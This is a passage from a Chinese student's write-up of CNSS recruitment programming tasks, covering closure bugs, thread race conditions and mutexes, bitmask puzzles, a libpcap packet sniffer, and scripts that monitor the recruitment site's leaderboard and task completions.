True: value = next(g) g = filter(g, value) print(value)except StopIteration: pass 程序虽然正确，但 IDE 给出了警告：用户定义的 filter 函数隐藏了 Python 内置的 filter 函数。 说来也是，为什么不直接使用更泛化的内置 filter 函数呢？于是他又把程序改成了这样。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming: incoming % value, g) print(value)except StopIteration: pass 很遗憾的是，程序输出的结果不再正确。到底是哪里出了问题？ 在调试的过程中，香肠觉得不能光调 Python 代码，JavaScript 的也不能放过。 考虑到 Python 采用了更泛化 filter 函数，于是他把原 JavaScript 代码也改成了这样。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 竟然出现了和第二份 Python 代码一样的错误输出结果。这是巧合吗？ 本题筛素数的协程叫什么协程？你能简单描述一下这样筛素数的过程吗？ 在JavaScript或Python中，利用惰性求值的生成器，可以逐步生成一个序列，并能在筛选过程中动态修改序列，避免占用过多计算资源。 1234567g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 核心思想是埃拉托斯特尼筛法（Sieve of Eratosthenes）。生成器iota生成一个从2到99的整数序列g，每次调用g中的值并通过生成器filter筛掉素数value的倍数，输出value，再移动到下一个数进行循环。 为什么第二份 Python 和第二份 JavaScript 的代码有问题？两者的问题是一样的吗？ 请你在第二份 Python 和第二份 JavaScript 基础上修改代码，在不失一般性的情况下解决存在的问题。 两者的问题不一样。 Python是和其延时绑定的机制有关。Python在真正执行函数（如lambda）的时候才会查找变量的值，而不是在定义函数时。 1g = filter(lambda incoming: incoming % value, g) 而在同一个作用域下，value的值始终针对同一个变量在变化，而不是每次循环都创建一个新变量。因此，所有的lambda中引用的value都会使用最新的值。 可以采用默认参数的方法解决这个问题。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming, value=value: incoming % value, g) print(value)except StopIteration: pass 这样，参数只会初始化一次，而在之后的循环中保持不变。 手动即时捕获。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter((lambda value: lambda incoming: incoming % value)(value), g) print(value)except StopIteration: pass 而JavaScript是与var的作用域规则有关。var在JavaScript中的作用域是函数作用域，而不是块作用域。循环体中每次声明的value实际上会在整个函数的作用域中共享，lambda函数捕获的是对同一个变量的引用，所以value会在每次循环后更新。 可以使用 let 代替 var。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { let {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 因为 let 是块作用域，在每次循环中会为 value 绑定一个新的变量，这样每个 lambda 函数都能捕获到当前循环中的 value，而不是共享的全局变量。 ⭐数数 计算机往往不够聪明（或者太过聪明），以至于他只会完全按照你的指令办事，尽管有时候你自己都不知道自己的指令是什么含义 CH1这道题目并不难，你要做的只是让计算机学会数数而已。 比如： 123456789101112131415161718192021222324252627#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); int counter; worker(&amp;counter); worker(&amp;counter); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 十分简单对吧？但是柳苏明却认为，让同一个 worker函数运行两遍效率太低了。为什么不雇佣两个 worker， 让他们同时工作呢？换句话说，他决定使用 多线程！ 于是他十分好心的给了你两份代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// V1#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter1, counter2; pthread_create(&amp;thread1, NULL, worker, &amp;counter1); pthread_create(&amp;thread2, NULL, worker, &amp;counter2); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter1 + counter2); return 0;}//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 但问题出现了，尽管第一份代码可以正常运行，但第二份代码在 输入值很大 时总是出现奇怪的偏差。 尝试运行测试这两段代码，回答： 为什么两份相似的代码会有不同的输出结果？ V1中每个线程独立地操作各自的counter1和counter2，互不干扰，最终把两个计数器的结果加和得到答案。 V2中通过多线程并发地对同一变量counter进行修改，这种操作存在竞争条件。意味着两个线程可能同时读写共享变量counter，导致计数不准确，尤其是在工作负荷较大的时候。 在编写多线程代码时，如何避免这种错误？ 引入同步机制，使用互斥锁来保证线程的独立访问，确保在同一时刻只有一个线程可以操作变量，避免竞争条件。 尝试只修改 worker 函数来使第二份代码输出正确。 123456789101112131415161718192021222324252627282930313233343536//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load; pthread_mutex_t lock; //锁的声明void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { pthread_mutex_lock(&amp;lock); //上锁 (* (int *)counter_ptr) += 1; pthread_mutex_unlock(&amp;lock); //解锁 } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_mutex_init(&amp;lock, NULL); //锁的初始化 pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); pthread_mutex_destroy(&amp;lock); //销毁 printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 运行一下，对比更改前后： 1234567$ ./countgive the workload per thread: 1000000000Totally count: 1007291379#------------------------------------------#$ ./countgive the workload per thread: 1000000000Totally count: 2000000000 CH2了解”互斥锁”这个概念，思考： 两个线程都同时访问了同一个变量：互斥锁 对于互斥锁的访问难道不会产生数据竞争吗？ 回答: 为什么访问互斥锁不会产生数据竞争？ 请尝试自己编写一个互斥锁(额外加分) 【操作系统】锁的实现 当一个线程获取互斥锁时，其他线程尝试获取必须等待，直到当前线程释放锁。互斥锁的实现由底层硬件或操作系统支持，通常通过某种原子操作，当一个线程访问其他线程持有的锁时，会被 OS 调度为阻塞状态（休眠），直到锁被释放后，再唤醒一个休眠的线程。 （另外，自旋锁是一种忙等待锁。它在锁被其他线程持有时不会阻塞当前线程，而是不断地尝试获取锁，直到锁可用为止。这种忙等待的行为称为“自旋”。） 使用了原子操作来实现互斥锁的加锁和解锁逻辑。 1234567891011121314151617typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield() //挂起，而非忙等待 } }void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);} 完整代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdatomic.h&gt;#include &lt;sched.h&gt;typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield(); }}void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}int work_load;my_mutex_t my_mutex;void *worker(void *counter_ptr) { for (int i = 0; i &lt; work_load; i++) { my_mutex_lock(&amp;my_mutex); (*(int *)counter_ptr) += 1; my_mutex_unlock(&amp;my_mutex); } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter = 0; my_mutex_init(&amp;my_mutex); pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 📟BitterCH112345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define BOARD_SIZE 8int upper_lim = 1;int count = 0;/** int row: store the valid bit after applying the vertical rule* int ld: store the valid bit after applying the left diagram rule* int rd: store the valid bit after applying the right diagram rule* bit '0' represent where we can place a chess*/void solve_problem(int row ,int ld, int rd) { if( row == upper_lim) { count += 1; return ; } /* 'current' represent all the valid bit*/ int current = upper_lim &amp; (~ (row | ld | rd)); int buffer = current; while(buffer) { int valid = buffer &amp; (-buffer); buffer -= valid; solve_problem(row|valid, (ld|valid)&lt;&lt;1, (rd|valid)&gt;&gt;1); /////////////////////////////////////// }}/* board_size shouldn't be too large */void find_n_th_queen(int board_size ) { upper_lim = (1 &lt;&lt; board_size) - 1; solve_problem(0, 0, 0);}int main() { find_n_th_queen(BOARD_SIZE); printf(&quot;Answer: %d&quot;, count);}// Answer: 92 CH2用位来标记数组元素的状态。 1234567891011121314151617181920212223242526def solve(nums): n = len(nums) states = 1 &lt;&lt; n max_sum = 0 for state in range(states): valid = True curr_sum = 0 for i in range(n): if state &amp; (1 &lt;&lt; i): #choose ith element curr_sum += nums[i] if i &gt; 0 and (state &amp; (1 &lt;&lt; (i - 1))): #conflict valid = False break if valid: max_sum = max(max_sum, curr_sum) return max_sumnums = [1, 15, 3, 7, 12, 10, 19, 8, 5, 17, 2, 6, 11, 9, 4, 14, 13, 18, 16, 20]print(solve(nums))'''130[Done] exited with code=0 in 0.965 seconds''' 动态规划可以显著降低时间。 加密算法：AES中存在行移位，哈希算法会使用位移、异或操作，提供安全性 快速运算：位移操作快速计算，奇偶判断，节约时间，bitset筛素数可节省空间 文件权限：使用位运算可以方便地开启或关闭某些标志位 并行计算：位运算可以快速地启用或禁用某个线程或者检查某个线程的状态 🎩顺手牵羊要求：使用C语言实现一个自己的抓包软件 使用libpcap库实现抓包。 程序应该实现：判断并输出每个包的类型，包的长度，以及包的源地址和目的地址。 如果你能实现对于TCP包的捕获，可以获得70%的分数。如果你能实现至少三种包的分析捕获，可以获得剩下30%的分数。 简单阐述下你对抓包的实现原理的理解，最高可得额外的20%分数。 hint：要不下载一个wireshark体验下抓包？ 题解： 在C语言中使用libpcap库来进行抓包操作。 安装libpcap库； 1sudo apt install libpcap-dev 实现对TCP包的捕获； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt; //提供了IP地址的转换函数#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt; //定义了IP和TCP头部的结构体// 回调函数在每次捕获到数据包时被调用void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); //跳过以太网帧头(14)、获取ip头 struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header-&gt;ip_hl * 4); //获取TCP头 printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header-&gt;ip_hl * 4); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header-&gt;th_off * 4); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4)); printf(&quot;---------------------------------------\\n&quot;);} //三个参数分别表示：用户传递的数据、数据包头部信息、指向实际的数据包内容int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; // 调用函数获取所有可用设备列表 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 选择第一个设备 device = alldevs; printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); pcap_loop(handle, 0, packet_handler, NULL); //捕获数据包，回调 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 编译运行上述代码，打开firefox，捕获到数据包： 1234567891011121314$ gcc -o packet_sniffer packet_sniffer -lpcap$ sudo ./packet_snifferUsing device: loopback0&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 1514 bytesExpected packet size: 1514 bytesIP header length (IHL) in bytes: 20Source Address: 127.0.0.1Destination Address: 127.0.0.1TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 1462 bytes---------------------------------------...... 这些数据包是在 WSL 2 内部通过 loopback 接口进行的本地通信，源头和目的地都是127.0.0.1。查找网络接口： 12345678910$ ip addr...4: loopback0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:15:5d:78:40:b2 brd ff:ff:ff:ff:ff:ff5: eth2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e0:2e:0b:08:09:53 brd ff:ff:ff:ff:ff:ff inet 192.168.0.144/24 brd 192.168.0.255 scope global noprefixroute eth2 valid_lft forever preferred_lft forever inet6 fe80::66a7:f661:86e5:c634/64 scope link nodad noprefixroute valid_lft forever preferred_lft forever 发现eth2是当前唯一状态为 UP 且配置了 IP 地址的接口，是WSL主要用于与外部网络通信的接口。修改代码： 1234567891011121314151617int main() { ... // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } ...} 编译运行结果如下： 1234567891011&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 66 bytesExpected packet size: 66 bytesIP header length (IHL) in bytes: 20Source Address: 192.168.0.144Destination Address: 34.107.243.93TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 14 bytes---------------------------------------... 实现对TCP、UDP和ICMP三种包的捕获： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;netinet/udp.h&gt;#include &lt;netinet/ip_icmp.h&gt;// 回调函数，用于处理捕获的数据包void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); // 跳过以太网头部（Ethernet header） int ip_header_length = ip_header-&gt;ip_hl * 4; printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header_length); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); // 检查IP包的协议字段以确定其类型 switch (ip_header-&gt;ip_p) { case IPPROTO_TCP: { struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header_length); int tcp_header_length = tcp_header-&gt;th_off * 4; printf(&quot;Protocol: TCP\\n&quot;); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + tcp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + tcp_header_length)); break; } case IPPROTO_UDP: { struct udphdr *udp_header = (struct udphdr *)(packet + 14 + ip_header_length); int udp_header_length = 8; // UDP header 固定长度为 8 字节 printf(&quot;Protocol: UDP\\n&quot;); printf(&quot;UDP header length in bytes: %d\\n&quot;, udp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + udp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, ntohs(udp_header-&gt;len) - udp_header_length); break; } case IPPROTO_ICMP: { struct icmphdr *icmp_header = (struct icmphdr *)(packet + 14 + ip_header_length); int icmp_header_length = 8; // ICMP header 通常为 8 字节 printf(&quot;Protocol: ICMP\\n&quot;); printf(&quot;ICMP header length in bytes: %d\\n&quot;, icmp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + icmp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + icmp_header_length)); break; } default: printf(&quot;Protocol: Other\\n&quot;); break; } printf(&quot;---------------------------------------\\n&quot;);}int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; int found = 0; // 使用 pcap_findalldevs 来获取所有可用设备 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); if (handle == NULL) { printf(&quot;Could not open device %s: %s\\n&quot;, device-&gt;name, errbuf); pcap_freealldevs(alldevs); return 1; } // 开始捕获数据包 pcap_loop(handle, 0, packet_handler, NULL); // 释放设备列表 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 运行代码抓包： 123456789101112&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 90 bytesExpected packet size: 90 bytesIP header length (IHL) in bytes: 20Source Address: 185.125.190.57Destination Address: 192.168.0.144Protocol: UDPUDP header length in bytes: 8Size of all headers combined: 28 bytesPayload size: 48 bytes---------------------------------------... 首先找到可用的网络接口，确保抓包工具监听到指定网络接口上的所有数据包；打开网络接口，置于混杂模式（1），以便捕获所有经过该接口的数据包；循环捕获包，调用回调函数，解析IP包头的字段，判断包所使用的传输层协议等等。 libpcap通过操作系统的网络驱动从链路层捕获数据包，将其暂存在内核缓冲区中，然后将数据包传递到用户空间供应用程序分析。 参考内容： C语言如何做抓包 👿busin的野心要求：请你写个程序，自动检测排行榜的变化。具体有如下两个需求： 招新网站的排行榜包含10个招新相关方向以及一个总分方向。如果这11个类别中的任意一个排行的前十名发生了变化，程序就会打印：1.新的前十名排行 2.哪一个人掉出了前十名 3.哪一个人进入了前十名。 程序应该监测特定的题目（使用动态容器的题目可以不被监测）。当有人通过了这个题目后，程序会按照f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;打印出这条信息。 将程序部署在服务器上实现24h运行，并能通过社交软件/邮箱/其他能从移动设备上接收到更新信息的方式，将信息发送到你的移动设备上，实现可视化的管理界面。 (ps:这可能需要一点SA的知识） 题解：首先编写程序rank.py实现打印排名变化情况。 在https://recruit.cnss.io/#/rank上，刷新页面在浏览器控制台网络中找到了fullrank，其通过XHR获取数据，说明排行榜的数据可能是通过该请求动态加载的。于是我们模拟浏览器的请求，**由于Token在随着时间变化，于是添加手动输入Token的部分：** 12345678910111213141516171819202122232425262728293031323334import requestsimport jsondef fetch(url, token): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: print(f&quot;Failed to fetch rankings. HTTP Status Code: {response.status_code}&quot;) print(f&quot;Response content: {response.text}&quot;) return None except requests.exceptions.RequestException as e: print(f&quot;Error fetching rankings: {e}&quot;) return None 主函数流程，记录old_rankings.json文件，fetch得到new_rankings，对新旧排行进行比较，打印信息，更新old_rankings。 12345678910111213141516171819202122232425def main(): url = &quot;https://recruit.cnss.io:8443/v1/fullrank&quot; token = input(&quot;Please enter your access token: &quot;).strip() if not token: print(&quot;Your Token cannot be NULL.&quot;) return try: with open(&quot;old_rankings.json&quot;, &quot;r&quot;) as file: old_rankings = json.load(file) except FileNotFoundError: old_rankings = {} new_rankings = fetch(url, token) if new_rankings: changes = compare(old_rankings, new_rankings) print_changes(changes) with open(&quot;old_rankings.json&quot;, &quot;w&quot;, encoding='utf-8') as file: json.dump(new_rankings, file, ensure_ascii=False, indent=4)if __name__ == &quot;__main__&quot;: main() 下面是compare和print函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def compare(old_rankings, new_rankings): changes = {} for direction, new_top10 in new_rankings.items(): old_top10 = old_rankings.get(direction, []) old_top10_users = [item['Name'] for item in old_top10[:10] if 'Name' in item] new_top10_users = [item['Name'] for item in new_top10[:10] if 'Name' in item] entered = set(new_top10_users) - set(old_top10_users) dropped = set(old_top10_users) - set(new_top10_users) order_changed = old_top10_users != new_top10_users #judge if entered or dropped or order_changed: changes[direction] = { 'new_top10': [{'Name': item['Name'], 'Score': item['Score']} for item in new_top10[:10] if 'Name' in item], 'entered': list(entered), 'dropped': list(dropped), 'order_changed': order_changed } return changesdef print_changes(changes): if not changes: print(&quot;排名未发生变化。&quot;) return for direction, details in changes.items(): print(f&quot;\\n方向: {direction}&quot;) print(&quot;新的前十名排行:&quot;) for rank, user in enumerate(details['new_top10'], start=1): print(f&quot; 名次 {rank}: {user['Name']} (得分: {user['Score']})&quot;) if details['entered']: print(f&quot;进入前十名的人: {', '.join(details['entered'])}&quot;) else: print(&quot;没有新进入前十名的人。&quot;) if details['dropped']: print(f&quot;掉出前十名的人: {', '.join(details['dropped'])}&quot;) else: print(&quot;没有掉出前十名的人。&quot;) if details['order_changed']: print(&quot;前十名内部顺序发生了变化。&quot;) 运行一下，得到输出。 接下来我们编写task.py程序。以一道题为例，我的思路是先在题目tasks那个页面，捕获特定题目的pass_number，当通过人数发生变化时，遍历用户，在passrecord寻找该题的通过者，异步化代码实现如下 Python异步网络编程利器——详解aiohttp的使用教程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import aiohttpimport asyncioimport jsonfrom datetime import datetimeTASK_URL = &quot;https://recruit.cnss.io:8443/v1/tasks/534&quot;PASSRECORD_URL_TEMPLATE = &quot;https://recruit.cnss.io:8443/v1/passrecord/{}&quot;TARGET_TASK_TITLE = &quot;👿busin的野心&quot;USER_ID_RANGE = range(530, 535)SLEEP_INTERVAL = 6previous_pass_number = Noneuser_submissions = {}token = &quot;&quot;async def fetch_pass_number(session): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: async with session.get(TASK_URL, headers=headers) as response: response.raise_for_status() data = await response.json() tasks = data.get('dev', []) for task in tasks: if task.get('title') == TARGET_TASK_TITLE: return task.get('pass_number') except aiohttp.ClientError as e: print(f&quot;获取任务数据时发生异常: {e}&quot;) except Exception as e: print(f&quot;处理任务数据时发生异常: {e}&quot;) return Noneasync def fetch_user_submission(session, user_id): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } url = PASSRECORD_URL_TEMPLATE.format(user_id) try: async with session.get(url, headers=headers) as response: response.raise_for_status() return await response.json() except aiohttp.ClientError as e: print(f&quot;获取用户 {user_id} 的数据时出错: {e}&quot;) except Exception as e: print(f&quot;处理用户 {user_id} 的数据时出错: {e}&quot;) return None 整个函数的逻辑是这样的：通过fetch初始化每个用户（这里是530到535）的提交内容，记录下来，然后每6秒去监测特定题目的通过人数有没有发生变化，一旦发生变化，调用check函数遍历比对，打印出信息。 12345678910111213141516171819async def main(): global token token = input(&quot;请输入Token: &quot;).strip() if not token: print(&quot;Token不能为空。&quot;) return user_ids = USER_ID_RANGE async with aiohttp.ClientSession() as session: await initialize_user_records(session, user_ids) while True: await monitor_pass_number(session, user_ids) await asyncio.sleep(SLEEP_INTERVAL)if __name__ == &quot;__main__&quot;: try: asyncio.run(main()) except KeyboardInterrupt: print(&quot;\\n程序已手动终止。&quot;) 下面我们完善遍历用户，进行初始化用户的提交内容： 12345678910async def initialize_user_records(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, submission in zip(user_ids, submissions): if submission is not None: user_submissions[user_id] = submission print(f&quot;初始记录已保存用户 {user_id}。&quot;) else: print(f&quot;未能获取用户 {user_id} 